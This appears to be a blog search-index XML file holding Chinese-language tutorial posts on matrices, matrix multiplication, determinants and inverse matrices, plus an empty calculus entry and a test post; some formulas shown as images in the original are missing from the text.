为什么这能行 ![8\ 1 变成 1\ (1/8)](https://www.shuxuele.com/algebra/images/matrix-gauss-jordan5.svg) 我是这样想：当我我们把 “8” 除以 8 来变成 “1”，而同时也对 “1” 做相同的运算，它就变成 “1/8”而 “1/8” 是 8 的（乘）逆 ![矩阵 A \ I 变成 I \ A 逆矩阵](https://www.shuxuele.com/algebra/images/matrix-gauss-jordan7.svg) 用比较专业的语言来说： 所有行运算的效果 是相等于 乘以 A-1故此，A 变成 I （因为 A-1A = I) 而同时， I 变成 A-1 （因为 A-1I = A-1)]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
        <tag>逆矩阵</tag>
        <tag>高斯若尔当</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆矩阵]]></title>
    <url>%2F2017%2F05%2F03%2F%E9%80%86%E7%9F%A9%E9%98%B5%2F</url>
    <content type="text"><![CDATA[逆矩阵是什么？数有倒数： 数的倒数 逆矩阵也是相同的概念，但我们写为A-1 为什么不写成 1/A? 因为我们不除以矩阵！而同时 1/8 也可以写成 8-1 还有其他相似之处： 把数与其倒数相乘的结果是 1 8 × (1/8) = 1 当我们把矩阵与其逆相乘，结果是单位矩阵（就像是矩阵里的”1”）： A × A-1 = I 把逆放在前面的结果是一样的： (1/8) × 8 = 1 A-1 × A = I 单位矩阵上面我们讲到”单位矩阵”。它是矩阵里的 “1”: 3x3 单位矩阵 它是个”方形”矩阵（相同数目的行和列）， 在对角线是 1，在其他位置是 0。 符号是大写字母 I。 单位矩阵可以是 2×2、或 3×3、4×4 等等 定义这是逆矩阵的定义： A的 逆（矩阵）是 A-1，仅当： A × A-1 = A-1 × A = I 但有些矩阵是没有逆矩阵的。 2x2 矩阵好了，怎样求逆矩阵呢？ 2x2 矩阵的逆是： 换句话说：调换 a 和 d 的位置，把 负号放在 b 和 c 前面，然后全部除以矩阵的 行列式 （ad-bc）。 看例子： 怎样知道答案是对的？ 我们上面说过： A × A-1 = I 我们把矩阵与逆矩阵相乘来看看： 哈！真的得到单位矩阵！所以答案是对的。 A-1 × A = I 也是对的。 你自己来试试把它们相乘，看看可不可以也得到单位矩阵： 我们为什么需要逆矩阵？以为我们不除矩阵！在矩阵世界里是没有除的概念的。 但我们可以乘以逆矩阵，这和除是相同的。 假设我们不能除以数字。。。。。。。。。。。。那我我们怎样”把10个苹果分给2个人”呢？ 我们可以用 2 的 倒数（等于 0.5）： 10 × 0.5 = 5 每人得到 5 个苹果。 矩阵也可以做同样的： 假设我们知道矩阵 A 和 B，而需要求矩阵 X: XA = B 如果可以每边除以 A （来得到 X=B/A）就最好了，但 我们不能除矩阵。 可是，把每边乘以 A-1 呢？ XAA-1 = BA-1 我们知道 AA-1 = I，所以： XI = BA-1 拿走 I （和把 “1” 从数子式子 1x = ab 拿走一样）： X = BA-1 得到答案了 (假设可以计算 A-1） 在这个例子中我们要非常小心去做矩阵相乘，因为在矩阵乘法，次序是重要的。AB 几乎永远都不会等于 BA. 实例：公交车与地铁 一帮人坐公交车，车费是小孩￥3，大人￥3.20，总共是￥118.40。 回程他们搭地铁，车费是小孩￥3.50，大人￥3.60，总共是￥135.20。 有几个小孩和几个大人？ 我们先把矩阵编排好（小心不要把行和列弄错！）： 这和上面的例子一样： XA = B 去解它我们需要 “A” 的逆： 算出逆矩阵后我们便可以这样解： X = BA-1 有16个小孩和22个大人！ 答案很奇妙的出现了。但计算是基于正确的数学逻辑的。 工程师用类似的计算（当然是用大得多的矩阵）来设计楼宇。类似的计算也应用在很多其他的领域，例如在电玩和电脑动画制作里用来显示三维物体。 这也是解线性方程组的一种方法。 计算在电脑中运算，但人必须要了解公式。 次序是重要的假设我们要求 “X”： AX = B 这和上面的例子不一样！ X 现在是在 A 的后面。 在矩阵乘法，次序通常会改变答案。千万不能假设 AB = BA，这几乎一定是错的。 那么我们怎样去解它？用同一方法，但把 A-1 放在前面： A-1AX = A-1B 我们知道 A-1A= I，所以： IX = A-1B 拿走 I： X = A-1B 得到答案了（假设我们可以计算 A-1） 可以这样做，但小心怎样编排矩阵。 正确地编排AX = B是这样： 很酷！我喜欢这个。 留意到与上面的例子比较，行与列调换了（”转置”了） 我们需要 “A” 的逆矩阵： 与上面的逆矩阵差不多，但转置了（行与列调换位置）。 算出逆矩阵后我们便可以这样解： X = A-1B 答案没变：16个小孩和22个大人。 矩阵是强大的工具，但一定要编排得正确！ 可能没有逆矩阵首先，矩阵一定要是”方形” （行和列数目相同）才能有逆矩阵。 同时，行列式不能是零 （不然便要除以零了）。看看这个： 24-24？ 等于 0， 1/0 是未定义的。不能继续做下去了！ 这矩阵没有逆矩阵。 这种矩阵叫 “降秩矩阵”，就是行列式为零的矩阵。 这合理。。。。。。来看数字：第二行不过是第一行的双倍，没有新的信息。 行列式就是告诉我们这个。 （假想在公交车例子里，地铁的车费全是比公交车贵一半：我们便不能找出大人和小孩的分别。一定要有某些东西来使他们不同，我们才可以算出小孩和大人的数量。） 更大的矩阵计算 2x2 矩阵的逆是 很容易的。。。。。。与更大的矩阵相比（例如 3x3 和 4x4等）。 计算大矩阵的逆，我们可以用三个方法： 用初等行运算（高斯－若尔当）来求逆矩阵 用余子式、代数余子式和伴随来求逆矩阵 用电脑（例如矩阵计算器) 结论 A 的逆矩阵是 A-1 仅当 A × A-1 = A-1 × A = I 求 2x2 矩阵的逆矩阵： 调换 a 和 d 的位置，把 负号 放在 b 和 c 前面，然后全部除以 矩阵的行列式 （ad-bc）。 有时候一个矩阵是没有逆矩阵的]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
        <tag>逆矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分部积分法]]></title>
    <url>%2F2017%2F05%2F01%2F%E5%88%86%E9%83%A8%E7%A7%AF%E5%88%86%E6%B3%95%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>分部积分法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[矩阵的行列式]]></title>
    <url>%2F2017%2F05%2F01%2F%E7%9F%A9%E9%98%B5%E7%9A%84%E8%A1%8C%E5%88%97%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[矩阵的行列式是一个可以从方形矩阵（方阵）计算出来的特别的数。 矩阵是数的排列： 矩阵（这矩阵有2行和2列） 这矩阵的行列式是（待会儿会解释计算方法）： 3×6 − 8×4 = 18 − 32 = −14 用来干什么的？行列式告诉我们矩阵的一些特性，这些特性对解线性方程组很有用，也可以帮我们找逆矩阵，并且在微积分及其他领域都很有用. 符号行列式的符号是每边一条垂直线。 例子： |A|代表矩阵 A的行列式 （和绝对值的符号一模一样。） 计算行列式首先，矩阵一定要是方形矩阵（就是，行和列的数目相同）。计算方法其实很简单，只不过是基本的算术，如下： 2×2 矩阵2×2 矩阵 （2行和2列）： 行列式是： |A| = ad - bc“A 的行列式等于 a 乘 d 减 b 乘 c” 把公式记住的窍门是想：十字乘法：蓝色 是 正 （+ad），红色 是 负 （-bc） 例子： \ B\ = 4×8 - 6×3 = 32-18 = 14 3×3 矩阵3×3 矩阵 （3行和3列）： 行列式是： |A| = a(ei - fh) - b(di - fg) + c(dh - eg)“A 的行列式等于。。。。。。” 乍看很复杂，但这是有规律的： 求 3×3 矩阵的行列式： 把 a 乘以不在 a 的行或列上的 2×2 矩阵的行列式。 以 b 和 c 也做相同的计算把结果加在一起，不过 b 前面有个负号！ 公式是（记着两边的垂直线 || 代表 “的行列式”）： “A 的行列式等于 a 乘 。。。。。。的行列式。。。。。。” 例子： **\ C\ ** = 6×(-2×7 - 5×8) - 1×(4×7 - 5×2) + 1×(4×8 - -2×2) = 6×(-54) - 1×(18) + 1×(36) = -306 4×4 和更大的矩阵同一规律也适用于 4×4 矩阵： 加：a 乘以 不在 a 的行或列 的矩阵 的行列式， 减：b 乘以 不在 b 的行或列 的矩阵 的行列式， 加：c 乘以 不在 c 的行或列 的矩阵 的行列式， 减：d 乘以 不在 d 的行或列 的矩阵 的行列式， 公式是： 留意 + - + - 的规律（+a 。。。-b 。。。+c 。。。-d 。。。）。 这很重要，要牢记。 同样的规律也适用于5×5 和更大的矩阵，但通常最好是用矩阵计算器来处理大的矩阵！ 并非唯一的方法这个计算放法叫 “拉普拉斯展开”。。。。。。我喜欢它，因为规律容易记。但亦有其他的计算方法（我只想你知道）。 总结 2×2 矩阵的行列式是 ad - bc 3×3 矩阵，把 a 乘以 不在 a 的行或列 的矩阵 的行列式。b 和 c 也做同样的计算，但 b 前面有个负号！ 更大的矩阵也跟随相同的规律： 把 a 乘以 不在 a 的行或列 的矩阵 的行列式；第一行的每个元素都这样做；然后把结果跟随 + - + - 的规律加/减起来。]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
        <tag>矩阵</tag>
        <tag>行列式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[矩阵相乘]]></title>
    <url>%2F2017%2F05%2F01%2F%E7%9F%A9%E9%98%B5%E7%9B%B8%E4%B9%98%2F</url>
    <content type="text"><![CDATA[矩阵是数的排列 矩阵（这矩阵有2行和3列） 把矩阵与一个数相乘是容易的： 计算是这样的： 2×4=8 2×0=0 2×1=2 2×-9=-18 我们叫这个数 （”2”）为标量，所以这乘法被称为”标量乘法”. 矩阵与矩阵相乘但若要把矩阵与矩阵相乘，我们要计算行与列的”点积“……这是什么意思？我们来看个例子： 求 第一行 和 第一列 的答案： “点积” 是把 对称的元素相乘，然后把结果加起来： (1, 2, 3) • (7, 9, 11) = 1×7 + 2×9 + 3×11 = 58 我们把第一个元素相配（1 和 7），然后相乘。第二个元素（2 和 9） 和第三个元素（3 和 11）也一样，然后把结果加起来。 想多看一个例子？这是第一行与第二列： (1, 2, 3) • (8, 10, 12) = 1×8 + 2×10 + 3×12 = 64 第二行 和 第一列也同样做： (4, 5, 6) • (7, 9, 11) = 4×7 + 5×9 + 6×11 = 139 第二行 和 第二列： (4, 5, 6) • (8, 10, 12) = 4×8 + 5×10 + 6×12 = 154 我们得到： 做好了！ 为什么要这样做？乍看像个过于复杂的乘法，但这是有道理的！ 看看一个实例： 例子：饼店卖三种派。 牛肉派卖￥3一个 鸡肉派卖￥4一个 素菜派卖￥2一个 这是过去4天里饼店卖的数目： 现在来想想……星期一的销售额是这样算出来的： 牛肉派的销售额 + 鸡肉派的销售额 + 素菜派的销售额 $3×13 + $4×8 + $2×6 = $83 总销售额是价钱与销售量的点积： ($3, $4, $2) • (13, 8, 6) = ￥3×13 + ￥4×8 + ￥2×6 = ￥83 我们把价钱和销售量相配，把它们逐个相乘，然后把结果 加起来。 换句话说： 星期一的销售额是：牛肉派：￥3×13=￥39，鸡肉派：￥4×8=￥32，素菜派：￥2×6=￥12。总共是 ￥39 + ￥32 + ￥12 = ￥83 星期二的销售额是：￥3×9 + ￥4×7 + ￥2**×4 = ￥63** 星期三的销售额是：￥3×7 + ￥4×4 + ￥2**×0 = ￥37** 星期四的销售额是：￥3×15 + ￥4×6 + ￥2**×3 = ￥75** 所以重点是要把价钱和销售量正确地相配。 明白为什么要用”点积”了吗？ 用矩阵写出来是这样： 星期一卖了￥83的派，星期二￥63，…… （你可以把这些值打进矩阵计算器来看看。） 行与列要表达一个矩阵有几行和几列，我们通常写 行×列。 例子：这是个 2×3 矩阵（2行和3列）： 把两个矩阵相乘时： 第一个矩阵的列数必须是等于第二个矩阵的行数。 相乘的结果具有第一个矩阵的 行数 和第二个矩阵的 列数。 例子： 在这例子里，我们把 1×3 矩阵乘以 3×4 矩阵（留意两个矩阵都有 3），相乘的结果是个 1×4矩阵。 一般来说： 把m×n矩阵与n×p矩阵相乘，n 必须相同，相乘结果是m×p矩阵。 乘法的次序在算术里我们知道： 3 × 5 = 5 × 3（乘法的互换律） 但在矩阵的领域这通常是不正常的（矩阵乘法并非可互换）： AB ≠ BA 当乘法的次序改变，答案亦（通常）改变。 例子：来看看次序怎样影响这矩阵相乘： 单位矩阵“单位矩阵” 是矩阵领域里的 “1”: 3x3 单位矩阵 单位矩阵是”方形”的（行与列数目相同）， 对角线全是1，其他全是0。 符号为大写字母 I。 它是个特别的矩阵，因为把它和一个矩阵相乘，后者不变： A × I = A I × A = A]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[矩阵]]></title>
    <url>%2F2017%2F05%2F01%2F%E7%9F%A9%E9%98%B5%2F</url>
    <content type="text"><![CDATA[矩阵是数的排列： 矩阵（这矩阵有2行和3列） 我们可以用矩阵来做很多。。。。。。 加把两个矩阵相加：把对称位置的数相加： 计算是这样： 3+4=7 8+0=8 4+1=5 6-9=-3 两个矩阵一定要大小相同，就是说，行要一样大小，列也要一样大小。 例子：具有3 行 和 5 列 的矩阵可以和另一个有 3 行 和 5 列的矩阵相加。 但它不能和有 3 行 和 4 列 的矩阵相加（列的大小不同） 负矩阵负矩阵也很简单： 计算是这样： -(2)=-2 -(-4)=+4 -(7)=-7 -(10)=-10 减把两个矩阵相减：把对称位置的数相减： 计算是这样： 3-4=-1 8-0=8 4-1=3 6-(-9)=15 注意：矩阵减法的定义实际是与负矩阵相加： A + (-B) 乘以常数我们可以把矩阵乘以常数： 计算是这样： 2×4=8 2×0=0 2×1=2 2×-9=-18 我们称这常数为 标量，故此这乘法的正式名字是 “标量乘法”. 与另一个矩阵相乘把两个矩阵相乘 是有点复杂。。。。。。请去矩阵乘法看看怎样做。 除法那除法呢？实际上，我们不把矩阵相除，我们这样做： A/B = A × (1/B) = A × B-1 其中 B-1 是 B 的 “逆矩阵”。 所以我们不做除法，我们乘以逆矩阵。 计算逆矩阵要用特别的方法。。。。。。 。。。。。。去逆矩阵了解更多。 矩阵转置去”转置” 一个转置，把行和列对换。 我们在右上角放一个 “T” 来代表转置： 记号法我们通常用英语大写字母（例如 A 或 B）来代表矩阵 矩阵里的每个数（”元素”）以小写字母来代表，并带上表示 “行，列“ 的 “下标数”： 行与列哪个是行？哪个是列？行 从 左至右列 从 上至下 例子： B = 这是一些例子： b1,1 = 6 （在行 1，列 1 的元素是 6） b1,3 = 24 （在行 1，列 3 的元素是 24） b2,3 = 8 （在行 2，列 3 的元素是 8）]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客-test]]></title>
    <url>%2F2017%2F01%2F01%2F%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[此片博客为测试专用。]]></content>
  </entry>
</search>
